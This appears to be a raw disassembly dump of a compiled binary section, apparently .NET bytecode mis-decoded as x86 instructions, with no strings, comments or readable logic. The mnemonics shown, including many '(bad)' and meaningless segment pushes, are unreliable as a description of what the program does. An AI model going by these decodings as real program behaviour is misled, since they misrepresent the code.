  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 c8                	jb     0x403042
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 d2 21 00       	and    $0x21d272,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
